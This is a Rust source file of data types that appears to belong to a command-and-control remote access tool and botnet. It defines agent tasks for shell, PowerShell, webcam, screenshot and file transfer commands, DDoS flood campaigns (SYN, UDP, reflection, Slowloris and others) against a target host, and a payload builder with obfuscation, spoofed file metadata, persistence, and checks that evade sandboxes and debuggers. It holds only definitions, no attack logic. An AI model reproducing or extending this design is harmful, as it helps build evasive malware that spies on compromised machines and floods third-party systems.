use serde::{Deserialize, Serialize};

// ── Enums ──────────────────────────────────────────────────────────────

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum AgentStatus {
    Online,
    Offline,
    Sleeping,
    Compromised,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum TaskStatus {
    Pending,
    Sent,
    Running,
    Completed,
    Failed,
    Cancelled,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum UserRole {
    Operator,
    Admin,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub enum CommandType {
    Shell,
    PowerShell,
    LocalAccounts,
    Upload,
    Download,
    Screenshot,
    Webcam,
    WifiScan,
    Kill,
    Sleep,
    Proxy,
    FileList,
    FileDrives,
    StressHttpFlood,
    StressSynFlood,
    StressUdpFlood,
    StressIcmpFlood,
    StressReflection,
    StressSlowloris,
    StressTcpConnFlood,
    StressMalformed,
    StressStop,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum CampaignStatus {
    Running,
    Stopped,
    Completed,
    Failed,
}

// ── Task ───────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct AgentTask {
    pub id: String,
    #[serde(default)]
    pub agent_id: String,
    #[serde(default)]
    pub created_by: String,
    pub command_type: CommandType,
    #[serde(default)]
    pub command: String,
    #[serde(default)]
    pub arguments: Vec<String>,
    pub status: TaskStatus,
    #[serde(default)]
    pub output: Option<String>,
    #[serde(default)]
    pub error: Option<String>,
    #[serde(default = "default_timeout")]
    pub timeout_seconds: i32,
}

fn default_timeout() -> i32 {
    60
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct TaskCreateRequest {
    #[serde(default)]
    pub agent_id: String,
    pub command_type: CommandType,
    #[serde(default)]
    pub command: String,
    #[serde(default)]
    pub arguments: Vec<String>,
    #[serde(default = "default_timeout")]
    pub timeout_seconds: i32,
}

impl AgentTask {
    pub fn new(id: String, agent_id: String, command_type: CommandType, command: String) -> Self {
        Self {
            id,
            agent_id,
            created_by: String::new(),
            command_type,
            command,
            arguments: Vec::new(),
            status: TaskStatus::Pending,
            output: None,
            error: None,
            timeout_seconds: 60,
        }
    }
}

// ── Hardware Info ──────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HardwareInfo {
    #[serde(default)]
    pub hwid: Option<String>,
    pub cpu: Option<CpuInfo>,
    #[serde(default)]
    pub gpus: Vec<GpuInfo>,
    #[serde(default)]
    pub disks: Vec<DiskInfo>,
    pub ram: Option<RamInfo>,
    #[serde(default)]
    pub displays: Vec<DisplayInfo>,
    #[serde(default)]
    pub motherboard_vendor: Option<String>,
    #[serde(default)]
    pub bios_version: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CpuInfo {
    #[serde(default)]
    pub name: String,
    pub physical_cores: usize,
    pub logical_cores: usize,
    pub max_clock_mhz: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GpuInfo {
    #[serde(default)]
    pub name: String,
    #[serde(default)]
    pub driver_version: Option<String>,
    pub vram_bytes: Option<u64>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DiskInfo {
    #[serde(default)]
    pub model: String,
    pub size_bytes: u64,
    #[serde(default)]
    pub media_type: Option<String>,
    #[serde(default)]
    pub serial_number: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RamInfo {
    pub total_bytes: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DisplayInfo {
    #[serde(default)]
    pub name: String,
    pub width: u32,
    pub height: u32,
}

// ── Stress Config ──────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct StressConfig {
    #[serde(default)]
    pub campaign_id: String,
    #[serde(default)]
    pub target_host: String,
    pub target_port: u16,
    #[serde(default)]
    pub methods: Vec<String>,
    pub duration_seconds: u64,
    #[serde(default = "default_threads")]
    pub threads_per_agent: u32,
    #[serde(default = "default_packet_size")]
    pub packet_size: usize,
    #[serde(default = "default_max_conns")]
    pub max_connections: usize,
    #[serde(default = "default_http_path")]
    pub http_path: String,
}

fn default_threads() -> u32 {
    100
}
fn default_packet_size() -> usize {
    1024
}
fn default_max_conns() -> usize {
    500
}
fn default_http_path() -> String {
    "/".into()
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct StressAgentStatus {
    pub campaign_id: String,
    pub agent_id: String,
    pub status: CampaignStatus,
    pub requests_sent: u64,
    pub bytes_sent: u64,
    pub errors: u64,
    pub timestamp: u64,
}

// ── Build Config ───────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct BuildConfigRequest {
    #[serde(default = "default_platform")]
    pub platform: String,
    #[serde(default = "default_app_type")]
    pub application_type: String,
    #[serde(default = "default_host")]
    pub server_host: String,
    #[serde(default = "default_port")]
    pub server_port: u16,
    #[serde(default)]
    pub enable_obfuscation: bool,
    #[serde(default)]
    pub inject_junk_data: bool,
    #[serde(default = "default_junk_mb")]
    pub junk_data_mb: usize,
    #[serde(default)]
    pub icon_url: Option<String>,
    #[serde(default)]
    pub company_name: Option<String>,
    #[serde(default)]
    pub file_description: Option<String>,
    #[serde(default)]
    pub product_name: Option<String>,
    #[serde(default)]
    pub copyright: Option<String>,
    #[serde(default)]
    pub file_version: Option<String>,
    #[serde(default = "default_true")]
    pub trim_unused: bool,
    #[serde(default)]
    pub require_admin: bool,
    #[serde(default)]
    pub copy_to_app_data: bool,
    #[serde(default)]
    pub enable_persistence: bool,
    /// Language selector: "csharp" or "rust"
    #[serde(default = "default_lang")]
    pub language: String,
}

fn default_platform() -> String {
    "x64".into()
}
fn default_app_type() -> String {
    "Console".into()
}
fn default_host() -> String {
    "127.0.0.1".into()
}
fn default_port() -> u16 {
    5270
}
fn default_junk_mb() -> usize {
    10
}
fn default_true() -> bool {
    true
}
fn default_lang() -> String {
    "csharp".into()
}

// ── Config Injection (appended to binary at build time) ────────────────

/// Magic bytes that mark the start of the injected config block.
pub const CONFIG_MAGIC: &[u8; 16] = b"LIBRA_CFG_BLOCK!";

/// Anti-analysis detection configuration.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AntiAnalysisConfig {
    #[serde(default)]
    pub enabled: bool,
    #[serde(default = "default_true")]
    pub check_cpu_cores: bool,
    #[serde(default = "default_min_cpu")]
    pub min_cpu_cores: u32,
    #[serde(default = "default_true")]
    pub check_memory: bool,
    #[serde(default = "default_min_memory")]
    pub min_memory_gb: u32,
    #[serde(default = "default_true")]
    pub check_disk_size: bool,
    #[serde(default = "default_min_disk")]
    pub min_disk_gb: u32,
    #[serde(default = "default_true")]
    pub check_debugger: bool,
    #[serde(default = "default_true")]
    pub check_vm_mac: bool,
    #[serde(default = "default_true")]
    pub check_username: bool,
    #[serde(default = "default_true")]
    pub check_usb_history: bool,
    #[serde(default = "default_min_usb")]
    pub min_usb_devices: u32,
    #[serde(default = "default_true")]
    pub check_test_signing: bool,
    #[serde(default = "default_true")]
    pub check_delay_sandbox: bool,
    #[serde(default = "default_delay_seconds")]
    pub delay_seconds: u32,
    #[serde(default = "default_true")]
    pub check_installed_software: bool,
    #[serde(default = "default_min_installed")]
    pub min_installed_software: u32,
    #[serde(default = "default_true")]
    pub check_screen_resolution: bool,
    #[serde(default = "default_true")]
    pub check_process_count: bool,
    #[serde(default = "default_min_processes")]
    pub min_processes: u32,
    #[serde(default = "default_true")]
    pub check_mouse_movement: bool,
    #[serde(default = "default_mouse_wait_seconds")]
    pub mouse_wait_seconds: u32,
}

fn default_min_cpu() -> u32 { 2 }
fn default_min_memory() -> u32 { 2 }
fn default_min_disk() -> u32 { 60 }
fn default_min_usb() -> u32 { 2 }
fn default_delay_seconds() -> u32 { 5 }
fn default_min_installed() -> u32 { 30 }
fn default_min_processes() -> u32 { 50 }
fn default_mouse_wait_seconds() -> u32 { 10 }

impl Default for AntiAnalysisConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            check_cpu_cores: true,
            min_cpu_cores: 2,
            check_memory: true,
            min_memory_gb: 2,
            check_disk_size: true,
            min_disk_gb: 60,
            check_debugger: true,
            check_vm_mac: true,
            check_username: true,
            check_usb_history: true,
            min_usb_devices: 2,
            check_test_signing: true,
            check_delay_sandbox: true,
            delay_seconds: 5,
            check_installed_software: true,
            min_installed_software: 30,
            check_screen_resolution: true,
            check_process_count: true,
            min_processes: 50,
            check_mouse_movement: true,
            mouse_wait_seconds: 10,
        }
    }
}

/// Config data injected into the binary at build time.
/// Accepts both camelCase (Rust) and snake_case (C#) field names.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct InjectedConfig {
    #[serde(alias = "server_url")]
    pub server_url: String,
    #[serde(alias = "register_path")]
    pub register_path: String,
    #[serde(alias = "heartbeat_path")]
    pub heartbeat_path: String,
    #[serde(alias = "result_path")]
    pub result_path: String,
    #[serde(alias = "ws_path")]
    pub ws_path: String,
    #[serde(alias = "heartbeat_interval_ms")]
    pub heartbeat_interval_ms: u64,
    #[serde(alias = "jitter_percent")]
    pub jitter_percent: f64,
    #[serde(alias = "require_admin")]
    pub require_admin: bool,
    #[serde(alias = "copy_to_path")]
    pub copy_to_path: Option<String>,
    #[serde(alias = "enable_persistence")]
    pub enable_persistence: bool,
    #[serde(default, alias = "encrypted_aes_key")]
    pub encrypted_aes_key: String,
    #[serde(default, alias = "core_download_path")]
    pub core_download_path: String,
    #[serde(default, alias = "rsa_private_key")]
    pub rsa_private_key: String,
    #[serde(default, alias = "anti_analysis")]
    pub anti_analysis: AntiAnalysisConfig,
}
